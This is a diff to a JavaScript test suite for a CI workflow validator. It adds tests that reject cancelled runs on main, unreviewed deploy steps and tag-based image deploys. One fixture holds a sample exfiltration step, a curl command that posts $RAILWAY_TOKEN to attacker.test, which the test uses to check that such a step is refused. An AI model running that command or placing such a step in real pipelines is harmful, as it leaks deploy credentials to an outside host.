@@ -194,9 +194,9 @@ test('publishes for the architecture the host actually runs', () => {
     String(step.run ?? '').includes('--push'),
   );
 
-  // The failure this prevents is the latest one possible: an amd64-only image passes the
-  // gate, passes the scan, publishes, pulls onto the arm64 host and dies at `compose up`
-  // with `exec format error` - after the migration has already run.
+  // Kept after the arm64 host went away: an amd64-only image is pulled by a developer on
+  // Apple silicon and dies with `exec format error`, which reads as a broken image rather
+  // than as a missing platform.
   push.run = push.run.replace('linux/amd64,linux/arm64', 'linux/amd64');
 
   assert.ok(
@@ -274,6 +274,65 @@ test('the deploy resolves a digest for this commit, not a tag', () => {
   assert.ok(
     validateCiWorkflowEnvelope(tagged, loaded.config).some((error) =>
       error.includes('not for a moving tag'),
+    ),
+  );
+});
+
+test('refuses to cancel a run on main', () => {
+  // `REVIEW-045`: the deploy's two `setImage` calls are not atomic. A second merge
+  // cancelling the first between them kills the job outside any catch - no rollback, no
+  // failure event, and the API and worker left on different digests.
+  const workflow = loadWorkflow();
+  workflow.concurrency['cancel-in-progress'] = true;
+
+  assert.ok(
+    validateCiWorkflowEnvelope(workflow, loaded.config).some((error) =>
+      error.includes('must not cancel a run on main'),
+    ),
+  );
+});
+
+test('refuses a deploy step that is not the reviewed three', () => {
+  for (const [step, expected] of [
+    [
+      {
+        name: 'Exfiltrate',
+        run: 'curl -d "$RAILWAY_TOKEN" https://attacker.test',
+      },
+      'is not a reviewed deploy step',
+    ],
+    [
+      { name: 'Migrate here', run: 'npm run migration:run:prod' },
+      'must not run migrations from the runner',
+    ],
+  ]) {
+    const workflow = loadWorkflow();
+    workflow.jobs.deploy.steps.push(step);
+    assert.ok(
+      validateCiWorkflowEnvelope(workflow, loaded.config).some((error) =>
+        error.includes(expected),
+      ),
+      `expected an error containing ${expected}`,
+    );
+  }
+});
+
+test('refuses a deploy that hands the script a tag', () => {
+  // The policy used to validate the command that *looked up* a digest, never the value
+  // exported from it. One word here deploys the platform's hour-old cache of `:main` and
+  // reports success.
+  const workflow = loadWorkflow();
+  const resolve = workflow.jobs.deploy.steps.find((step) =>
+    String(step.run ?? '').includes('docker-content-digest'),
+  );
+  resolve.run = resolve.run.replace(
+    'APP_IMAGE=${IMAGE}@${DIGEST}',
+    'APP_IMAGE=${IMAGE}:main',
+  );
+
+  assert.ok(
+    validateCiWorkflowEnvelope(workflow, loaded.config).some((error) =>
+      error.includes('must export APP_IMAGE as the resolved digest'),
     ),
   );
 });
